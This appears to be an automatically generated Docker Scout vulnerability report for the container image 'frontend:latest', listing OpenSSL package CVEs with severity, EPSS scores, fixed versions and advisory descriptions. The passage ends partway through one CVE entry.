<h2>:mag: Vulnerabilities of <code>frontend:latest</code></h2>

<details open="true"><summary>:package: Image Reference</strong> <code>frontend:latest</code></summary>
<table>
<tr><td>digest</td><td><code>sha256:b1aa5ca79a6be4d51c91526f238c40069f2cf86b1923f02d6ab758cc6e4edbed</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 2" src="https://img.shields.io/badge/critical-2-8b1924"/> <img alt="high: 46" src="https://img.shields.io/badge/high-46-e25d68"/> <img alt="medium: 51" src="https://img.shields.io/badge/medium-51-fbb552"/> <img alt="low: 71" src="https://img.shields.io/badge/low-71-fce1a9"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/unspecified-1-lightgrey"/></td></tr>
<tr><td>platform</td><td>linux/amd64</td></tr>
<tr><td>size</td><td>98 MB</td></tr>
<tr><td>packages</td><td>189</td></tr>
</table>
</details></table>
</details>

<table>
<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 12" src="https://img.shields.io/badge/H-12-e25d68"/> <img alt="medium: 7" src="https://img.shields.io/badge/M-7-fbb552"/> <img alt="low: 10" src="https://img.shields.io/badge/L-10-fce1a9"/> <!-- unspecified: 0 --><strong>openssl</strong> <code>3.0.14-1~deb12u2</code> (deb)</summary>

<small><code>pkg:deb/debian/openssl@3.0.14-1~deb12u2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-5535?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.15-1%7Edeb12u1"><img alt="critical : CVE--2024--5535" src="https://img.shields.io/badge/CVE--2024--5535-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.15-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.15-1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>6.702%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>91st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Calling the OpenSSL API function SSL_select_next_proto with an empty supported client protocols buffer may cause a crash or memory contents to be sent to the peer.  Impact summary: A buffer overread can have a range of potential consequences such as unexpected application beahviour or a crash. In particular this issue could result in up to 255 bytes of arbitrary private data from memory being sent to the peer leading to a loss of confidentiality. However, only applications that directly call the SSL_select_next_proto function with a 0 length list of supported client protocols are affected by this issue. This would normally never be a valid scenario and is typically not under attacker control but may occur by accident in the case of a configuration or programming error in the calling application.  The OpenSSL API function SSL_select_next_proto is typically used by TLS applications that support ALPN (Application Layer Protocol Negotiation) or NPN (Next Protocol Negotiation). NPN is older, was never standardised and is deprecated in favour of ALPN. We believe that ALPN is significantly more widely deployed than NPN. The SSL_select_next_proto function accepts a list of protocols from the server and a list of protocols from the client and returns the first protocol that appears in the server list that also appears in the client list. In the case of no overlap between the two lists it returns the first item in the client list. In either case it will signal whether an overlap between the two lists was found. In the case where SSL_select_next_proto is called with a zero length client list it fails to notice this condition and returns the memory immediately following the client list pointer (and reports that there was no overlap in the lists).  This function is typically called from a server side application callback for ALPN or a client side application callback for NPN. In the case of ALPN the list of protocols supplied by the client is guaranteed by libssl to never be zero in length. The list of server protocols comes from the application and should never normally be expected to be of zero length. In this case if the SSL_select_next_proto function has been called as expected (with the list supplied by the client passed in the client/client_len parameters), then the application will not be vulnerable to this issue. If the application has accidentally been configured with a zero length server list, and has accidentally passed that zero length server list in the client/client_len parameters, and has additionally failed to correctly handle a "no overlap" response (which would normally result in a handshake failure in ALPN) then it will be vulnerable to this problem.  In the case of NPN, the protocol permits the client to opportunistically select a protocol when there is no overlap. OpenSSL returns the first client protocol in the no overlap case in support of this. The list of client protocols comes from the application and should never normally be expected to be of zero length. However if the SSL_select_next_proto function is accidentally called with a client_len of 0 then an invalid memory pointer will be returned instead. If the application uses this output as the opportunistic protocol then the loss of confidentiality will occur.  This issue has been assessed as Low severity because applications are most likely to be vulnerable if they are using NPN instead of ALPN - but NPN is not widely used. It also requires an application configuration or programming error. Finally, this issue would not typically be under attacker control making active exploitation unlikely.  The FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.  Due to the low severity of this issue we are not issuing new releases of OpenSSL at this time. The fix will be included in the next releases when they become available.

---
- openssl 3.3.2-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1074487)
[bookworm] - openssl 3.0.15-1~deb12u1
https://www.openssl.org/news/secadv/20240627.txt
https://github.com/openssl/openssl/commit/2ebbe2d7ca8551c4cb5fbb391ab9af411708090e
https://github.com/openssl/openssl/commit/c6e1ea223510bb7104bf0c41c0c45eda5a16b718
https://github.com/openssl/openssl/commit/fc8ff75814767d6c55ea78d05adc72cd346d0f0a
https://github.com/openssl/openssl/commit/a210f580f450bbd08fac85f06e27107b8c580f9b
https://github.com/openssl/openssl/commit/0d883f6309b6905d29ffded6d703ded39385579c
https://github.com/openssl/openssl/commit/9925c97a8e8c9887765a0979c35b516bc8c3af85
https://github.com/openssl/openssl/commit/e10a3a84bf73a3e6024c338b51f2fb4e78a3dee9
https://github.com/openssl/openssl/commit/238fa464d6e38aa2c92af70ef9580c74cff512e4
https://github.com/openssl/openssl/commit/de71058567b84c6e14b758a383e1862eb3efb921
https://github.com/openssl/openssl/commit/214c724e00d594c3eecf4b740ee7af772f0ee04a

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-45447?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.20-1%7Edeb12u2"><img alt="high : CVE--2026--45447" src="https://img.shields.io/badge/CVE--2026--45447-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.20-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.20-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.092%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: A specially crafted PKCS#7 or S/MIME signed message could trigger a use-after-free during PKCS#7 signature verification.  Impact summary: A use-after-free may result in process crashes, heap corruption, or potentially remote code execution.  When processing a PKCS#7 or S/MIME signed message, if the SignedData digestAlgorithms field is present as an empty ASN.1 SET, OpenSSL may incorrectly free a caller-owned BIO during PKCS7_verify(). A subsequent use of the BIO by the calling application results in a use-after-free condition.  In the common case this occurs when the application later calls BIO_free() on the BIO originally passed to PKCS7_verify(). Depending on allocator behavior and application-specific BIO usage patterns, this may result in a crash or other memory corruption. In some application contexts this may potentially be exploitable for remote code execution.  Applications that process PKCS#7 or S/MIME signed messages using OpenSSL PKCS#7 APIs may be affected. Applications using the CMS APIs for this processing are not affected.  The FIPS modules in 4.0, 3.6, 3.5, 3.4, and 3.0 are not affected by this issue, as the affected code is outside the OpenSSL FIPS module boundary.

---
- openssl <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1139674)
https://openssl-library.org/news/secadv/20260609.txt
Fixed by: https://github.com/openssl/openssl/commit/9dfd688ad2290fc5075cacbc9bf0c9a93eefed54 (openssl-3.0.21)
Fixed by: https://github.com/openssl/openssl/commit/18de9aba8294b5fb0915866cf3a1bb45f9599b8d (openssl-3.0.21)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-7383?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.20-1%7Edeb12u2"><img alt="high : CVE--2026--7383" src="https://img.shields.io/badge/CVE--2026--7383-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.20-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.20-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.067%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: A signed integer overflow when sizing the destination buffer for Unicode output in ASN1_mbstring_ncopy() can lead to a heap buffer overflow.  Impact summary: A heap buffer overflow may lead to a crash or possibly attacker controlled code execution or other undefined behaviour.  In ASN1_mbstring_copy() and ASN1_mbstring_ncopy() the destination size for Unicode output is computed in a signed int: by left shift of the input character count for BMPSTRING (UTF-16) and UNIVERSALSTRING (UTF-32), and by summing per-character byte counts for UTF8STRING. The calculation overflows when the input reaches around 2^30 characters. In the worst case (UNIVERSALSTRING at 2^30 characters) the size wraps to zero, OPENSSL_malloc(1) is called, and the subsequent character copy writes several gigabytes past the one-byte allocation.  X.509 certificate processing routes through ASN1_STRING_set_by_NID(), whose DIRSTRING_TYPE mask excludes UNIVERSALSTRING and whose per-NID size limits cap the input length; no network protocol or certificate-handling path in OpenSSL exercises the overflow. Triggering the bug requires an application that calls ASN1_mbstring_copy() or ASN1_mbstring_ncopy() directly, or registers a custom string type via ASN1_STRING_TABLE_add(), with attacker-controlled input on the order of half a gigabyte or more. For these reasons this issue was assigned Low severity.  The FIPS modules in 4.0, 3.6, 3.5, 3.4 and 3.0 are not affected by this issue, as the affected code is outside the OpenSSL FIPS module boundary.

---
- openssl <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1139674)
https://openssl-library.org/news/secadv/20260609.txt
Fixed by: https://github.com/openssl/openssl/commit/bd17511070fb39a67bfa19682affb765e706a974 (openssl-3.0.21)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-28387?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.19-1%7Edeb12u2"><img alt="high : CVE--2026--28387" src="https://img.shields.io/badge/CVE--2026--28387-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.19-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.19-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.047%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: An uncommon configuration of clients performing DANE TLSA-based server authentication, when paired with uncommon server DANE TLSA records, may result in a use-after-free and/or double-free on the client side.  Impact summary: A use after free can have a range of potential consequences such as the corruption of valid data, crashes or execution of arbitrary code.  However, the issue only affects clients that make use of TLSA records with both the PKIX-TA(0/PKIX-EE(1) certificate usages and the DANE-TA(2) certificate usage.  By far the most common deployment of DANE is in SMTP MTAs for which RFC7672 recommends that clients treat as 'unusable' any TLSA records that have the PKIX certificate usages.  These SMTP (or other similar) clients are not vulnerable to this issue.  Conversely, any clients that support only the PKIX usages, and ignore the DANE-TA(2) usage are also not vulnerable.  The client would also need to be communicating with a server that publishes a TLSA RRset with both types of TLSA records.  No FIPS modules are affected by this issue, the problem code is outside the FIPS module boundary.

---
- openssl 3.6.2-1
https://openssl-library.org/news/secadv/20260407.txt

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-9076?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.20-1%7Edeb12u2"><img alt="high : CVE--2026--9076" src="https://img.shields.io/badge/CVE--2026--9076-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.20-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.20-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.096%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: When CMS password-based decryption (RFC 3211 / PWRI key unwrap) processes attacker-supplied CMS data, an attacker-chosen stream-mode KEK cipher can trigger a heap out-of-bounds read in kek_unwrap_key().  Impact summary: A heap buffer over-read may trigger a crash which leads to Denial of Service for an application if the input buffer ends at a memory page boundary and the following page is unmapped. There is no information disclosure as the over-read bytes are not revealed to the attacker.  The key unwrapping function performs a check-byte test as specified in the RFC that reads 7 bytes from a heap allocation that is based on the wrapped key length from the message. There is a minimum length check based on the block length of the wrapping cipher. However the cipher is selected from an OID carried in the attacker's PWRI keyEncryptionAlgorithm with no requirement that the cipher be a block cipher. When an attacker selects a stream-mode cipher the guard will be ineffective and the allocated buffer containing the unwrapped key can be too small to fit the check-bytes specified in the RFC and a buffer over-read can happen.  Applications calling CMS_decrypt() or CMS_decrypt_set1_password() (equivalently openssl cms -decrypt -pwri_password ...) on untrusted CMS data are vulnerable to this issue. No password knowledge is required: the over-read happens during the unwrap attempt before any authentication succeeds.  The over-read is limited to a few bytes and is not written to output, so there is no information disclosure. Triggering a crash requires the allocation to border unmapped memory, which is unlikely with the normal allocator.  The FIPS modules are not affected by this issue.

---
- openssl <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1139674)
https://openssl-library.org/news/secadv/20260609.txt
Fixed by: https://github.com/openssl/openssl/commit/eecbe330977e8d023aae1ca2d9bdbe983ef3fdc6 (openssl-3.0.21)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-34180?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.20-1%7Edeb12u2"><img alt="high : CVE--2026--34180" src="https://img.shields.io/badge/CVE--2026--34180-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.20-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.20-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.059%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>19th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Parsing a crafted DER-encoded ASN.1 structure with a primitive element whose content exceeds 2 gigabytes in length may cause a heap buffer over-read on 64-bit Unix and Unix-like platforms.  Impact summary: The heap buffer over-read may crash the application (Denial of Service) or to load into the decoded ASN.1 object contents of memory beyond the end of the input buffer.  More typically such ASN.1 elements would instead be truncated.  An integer truncation in OpenSSL's ASN.1 decoder causes the content length of an ASN.1 primitive element to be mishandled when it exceeds 2 gigabytes. In the worst case the truncated length is treated as a request to scan the binary content for a terminating zero byte, possibly causing OpenSSL to read either less than or beyond the end of the allocated buffer.  Applications that pass attacker-supplied data to d2i_X509(), d2i_PKCS7(), or any other d2i_* decoding function are affected. OpenSSL's own command-line tools are not vulnerable, as data read through the BIO layer is checked before it reaches the affected code. The issue only affects 64-bit Unix and Unix-like platforms; 32-bit platforms and 64-bit Windows are not affected.  The FIPS modules in 4.0, 3.6, 3.5, 3.4 and 3.0 are not affected by this issue, as the affected code is outside the OpenSSL FIPS module boundary.

---
- openssl <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1139674)
https://openssl-library.org/news/secadv/20260609.txt
Fixed by: https://github.com/openssl/openssl/commit/cbe418ae978539cf14a398a207dba834c0e93e83 (openssl-3.0.21)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-28390?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.19-1%7Edeb12u2"><img alt="high : CVE--2026--28390" src="https://img.shields.io/badge/CVE--2026--28390-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.19-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.19-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.140%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>34th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: During processing of a crafted CMS EnvelopedData message with KeyTransportRecipientInfo a NULL pointer dereference can happen.  Impact summary: Applications that process attacker-controlled CMS data may crash before authentication or cryptographic operations occur resulting in Denial of Service.  When a CMS EnvelopedData message that uses KeyTransportRecipientInfo with RSA-OAEP encryption is processed, the optional parameters field of RSA-OAEP SourceFunc algorithm identifier is examined without checking for its presence. This results in a NULL pointer dereference if the field is missing.  Applications and services that call CMS_decrypt() on untrusted input (e.g., S/MIME processing or CMS-based protocols) are vulnerable.  The FIPS modules in 3.6, 3.5, 3.4, 3.3 and 3.0 are not affected by this issue, as the affected code is outside the OpenSSL FIPS module boundary.

---
- openssl 3.6.2-1
https://openssl-library.org/news/secadv/20260407.txt

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-28389?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.19-1%7Edeb12u2"><img alt="high : CVE--2026--28389" src="https://img.shields.io/badge/CVE--2026--28389-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.19-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.19-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.141%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>34th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: During processing of a crafted CMS EnvelopedData message with KeyAgreeRecipientInfo a NULL pointer dereference can happen.  Impact summary: Applications that process attacker-controlled CMS data may crash before authentication or cryptographic operations occur resulting in Denial of Service.  When a CMS EnvelopedData message that uses KeyAgreeRecipientInfo is processed, the optional parameters field of KeyEncryptionAlgorithmIdentifier is examined without checking for its presence. This results in a NULL pointer dereference if the field is missing.  Applications and services that call CMS_decrypt() on untrusted input (e.g., S/MIME processing or CMS-based protocols) are vulnerable.  The FIPS modules in 3.6, 3.5, 3.4, 3.3 and 3.0 are not affected by this issue, as the affected code is outside the OpenSSL FIPS module boundary.

---
- openssl 3.6.2-1
https://openssl-library.org/news/secadv/20260407.txt

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-28388?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.19-1%7Edeb12u2"><img alt="high : CVE--2026--28388" src="https://img.shields.io/badge/CVE--2026--28388-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.19-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.19-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.055%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>18th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: When a delta CRL that contains a Delta CRL Indicator extension is processed a NULL pointer dereference might happen if the required CRL Number extension is missing.  Impact summary: A NULL pointer dereference can trigger a crash which leads to a Denial of Service for an application.  When CRL processing and delta CRL processing is enabled during X.509 certificate verification, the delta CRL processing does not check whether the CRL Number extension is NULL before dereferencing it. When a malformed delta CRL file is being processed, this parameter can be NULL, causing a NULL pointer dereference.  Exploiting this issue requires the X509_V_FLAG_USE_DELTAS flag to be enabled in the verification context, the certificate being verified to contain a freshestCRL extension or the base CRL to have the EXFLAG_FRESHEST flag set, and an attacker to provide a malformed CRL to an application that processes it.  The vulnerability is limited to Denial of Service and cannot be escalated to achieve code execution or memory disclosure. For that reason the issue was assessed as Low severity according to our Security Policy.  The FIPS modules in 3.6, 3.5, 3.4, 3.3 and 3.0 are not affected by this issue, as the affected code is outside the OpenSSL FIPS module boundary.

---
- openssl 3.6.2-1
https://openssl-library.org/news/secadv/20260407.txt

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-9230?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.17-1%7Edeb12u3"><img alt="high : CVE--2025--9230" src="https://img.shields.io/badge/CVE--2025--9230-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.17-1~deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.17-1~deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.041%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: An application trying to decrypt CMS messages encrypted using password based encryption can trigger an out-of-bounds read and write.  Impact summary: This out-of-bounds read may trigger a crash which leads to Denial of Service for an application. The out-of-bounds write can cause a memory corruption which can have various consequences including a Denial of Service or Execution of attacker-supplied code.  Although the consequences of a successful exploit of this vulnerability could be severe, the probability that the attacker would be able to perform it is low. Besides, password based (PWRI) encryption support in CMS messages is very rarely used. For that reason the issue was assessed as Moderate severity according to our Security Policy.  The FIPS modules in 3.5, 3.4, 3.3, 3.2, 3.1 and 3.0 are not affected by this issue, as the CMS implementation is outside the OpenSSL FIPS module boundary.

---
- openssl 3.5.4-1
https://openssl-library.org/news/secadv/20250930.txt
Fixed by: https://github.com/openssl/openssl/commit/5965ea5dd6960f36d8b7f74f8eac67a8eb8f2b45 (openssl-3.3.5)
Fixed by: https://github.com/openssl/openssl/commit/9e91358f365dee6c446dcdcdb01c04d2743fd280 (openssl-3.4.3)
Fixed by: https://github.com/openssl/openssl/commit/b5282d677551afda7d20e9c00e09561b547b2dfd (openssl-3.2.6)
Fixed by: https://github.com/openssl/openssl/commit/a79c4ce559c6a3a8fd4109e9f33c1185d5bf2def (openssl-3.0.18)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69421?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.18-1%7Edeb12u2"><img alt="high : CVE--2025--69421" src="https://img.shields.io/badge/CVE--2025--69421-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.18-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.18-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.128%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Processing a malformed PKCS#12 file can trigger a NULL pointer dereference in the PKCS12_item_decrypt_d2i_ex() function.  Impact summary: A NULL pointer dereference can trigger a crash which leads to Denial of Service for an application processing PKCS#12 files.  The PKCS12_item_decrypt_d2i_ex() function does not check whether the oct parameter is NULL before dereferencing it. When called from PKCS12_unpack_p7encdata() with a malformed PKCS#12 file, this parameter can be NULL, causing a crash. The vulnerability is limited to Denial of Service and cannot be escalated to achieve code execution or memory disclosure.  Exploiting this issue requires an attacker to provide a malformed PKCS#12 file to an application that processes it. For that reason the issue was assessed as Low severity according to our Security Policy.  The FIPS modules in 3.6, 3.5, 3.4, 3.3 and 3.0 are not affected by this issue, as the PKCS#12 implementation is outside the OpenSSL FIPS module boundary.  OpenSSL 3.6, 3.5, 3.4, 3.3, 3.0, 1.1.1 and 1.0.2 are vulnerable to this issue.

---
- openssl 3.5.5-1
https://openssl-library.org/news/secadv/20260127.txt
Fixed by: https://github.com/openssl/openssl/commit/3524a29271f8191b8fd8a5257eb05173982a097b (openssl-3.5.5)
Fixed by: https://github.com/openssl/openssl/commit/36ecb4960872a4ce04bf6f1e1f4e78d75ec0c0c7 (openssl-3.0.19)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69420?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.18-1%7Edeb12u2"><img alt="high : CVE--2025--69420" src="https://img.shields.io/badge/CVE--2025--69420-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.18-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.18-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.131%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>79th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: A type confusion vulnerability exists in the TimeStamp Response verification code where an ASN1_TYPE union member is accessed without first validating the type, causing an invalid or NULL pointer dereference when processing a malformed TimeStamp Response file.  Impact summary: An application calling TS_RESP_verify_response() with a malformed TimeStamp Response can be caused to dereference an invalid or NULL pointer when reading, resulting in a Denial of Service.  The functions ossl_ess_get_signing_cert() and ossl_ess_get_signing_cert_v2() access the signing cert attribute value without validating its type. When the type is not V_ASN1_SEQUENCE, this results in accessing invalid memory through the ASN1_TYPE union, causing a crash.  Exploiting this vulnerability requires an attacker to provide a malformed TimeStamp Response to an application that verifies timestamp responses. The TimeStamp protocol (RFC 3161) is not widely used and the impact of the exploit is just a Denial of Service. For these reasons the issue was assessed as Low severity.  The FIPS modules in 3.5, 3.4, 3.3 and 3.0 are not affected by this issue, as the TimeStamp Response implementation is outside the OpenSSL FIPS module boundary.  OpenSSL 3.6, 3.5, 3.4, 3.3, 3.0 and 1.1.1 are vulnerable to this issue.  OpenSSL 1.0.2 is not affected by this issue.

---
- openssl 3.5.5-1
https://openssl-library.org/news/secadv/20260127.txt
Fixed by: https://github.com/openssl/openssl/commit/564fd9c73787f25693bf9e75faf7bf6bb1305d4e (openssl-3.5.5)
Fixed by: https://github.com/openssl/openssl/commit/4e254b48ad93cc092be3dd62d97015f33f73133a (openssl-3.0.19)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69419?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.18-1%7Edeb12u2"><img alt="high : CVE--2025--69419" src="https://img.shields.io/badge/CVE--2025--69419-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.18-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.18-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.115%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>30th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Calling PKCS12_get_friendlyname() function on a maliciously crafted PKCS#12 file with a BMPString (UTF-16BE) friendly name containing non-ASCII BMP code point can trigger a one byte write before the allocated buffer.  Impact summary: The out-of-bounds write can cause a memory corruption which can have various consequences including a Denial of Service.  The OPENSSL_uni2utf8() function performs a two-pass conversion of a PKCS#12 BMPString (UTF-16BE) to UTF-8. In the second pass, when emitting UTF-8 bytes, the helper function bmp_to_utf8() incorrectly forwards the remaining UTF-16 source byte count as the destination buffer capacity to UTF8_putc(). For BMP code points above U+07FF, UTF-8 requires three bytes, but the forwarded capacity can be just two bytes. UTF8_putc() then returns -1, and this negative value is added to the output length without validation, causing the length to become negative. The subsequent trailing NUL byte is then written at a negative offset, causing write outside of heap allocated buffer.  The vulnerability is reachable via the public PKCS12_get_friendlyname() API when parsing attacker-controlled PKCS#12 files. While PKCS12_parse() uses a different code path that avoids this issue, PKCS12_get_friendlyname() directly invokes the vulnerable function. Exploitation requires an attacker to provide a malicious PKCS#12 file to be parsed by the application and the attacker can just trigger a one zero byte write before the allocated buffer. For that reason the issue was assessed as Low severity according to our Security Policy.  The FIPS modules in 3.6, 3.5, 3.4, 3.3 and 3.0 are not affected by this issue, as the PKCS#12 implementation is outside the OpenSSL FIPS module boundary.  OpenSSL 3.6, 3.5, 3.4, 3.3, 3.0 and 1.1.1 are vulnerable to this issue.  OpenSSL 1.0.2 is not affected by this issue.

---
- openssl 3.5.5-1
https://openssl-library.org/news/secadv/20260127.txt
Fixed by: https://github.com/openssl/openssl/commit/ff628933755075446bca8307e8417c14d164b535 (openssl-3.5.5)
Fixed by: https://github.com/openssl/openssl/commit/41be0f216404f14457bbf3b9cc488dba60b49296 (openssl-3.0.19)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42766?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.20-1%7Edeb12u2"><img alt="medium : CVE--2026--42766" src="https://img.shields.io/badge/CVE--2026--42766-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.20-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.20-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.066%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: A specially crafted password-encrypted CMS message can trigger a NULL pointer dereference during CMS decryption.  Impact summary: This NULL pointer dereference leads to an application crash and a Denial of Service.  The CMS PasswordRecipientInfo.keyDerivationAlgorithm field is defined as OPTIONAL in the ASN.1 specification and may therefore be absent in specially crafted inputs. During the password-based CMS decryption the OpenSSL CMS implementation dereferences this field without first checking whether it was present.  An attacker who supplies such a CMS message to an application performing password-based CMS decryption can trigger an application crash, leading to a Denial of Service.  Applications that process password-encrypted CMS messages may be affected.  The FIPS modules in 4.0, 3.6, 3.5, 3.4, and 3.0 are not affected by this issue, as the affected code is outside the OpenSSL FIPS module boundary.

---
- openssl <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1139674)
https://openssl-library.org/news/secadv/20260609.txt
Fixed by: https://github.com/openssl/openssl/commit/3ff64913615d648cfbb6a6f1cf5529ae7ea829d7 (openssl-3.0.21)
Fixed by: https://github.com/openssl/openssl/commit/ba699b606969d20a108dda3cfe5422d4cc94eefb (openssl-3.0.21)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-22795?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.18-1%7Edeb12u2"><img alt="medium : CVE--2026--22795" src="https://img.shields.io/badge/CVE--2026--22795-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.18-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.18-1~deb12u2</code></td></tr>
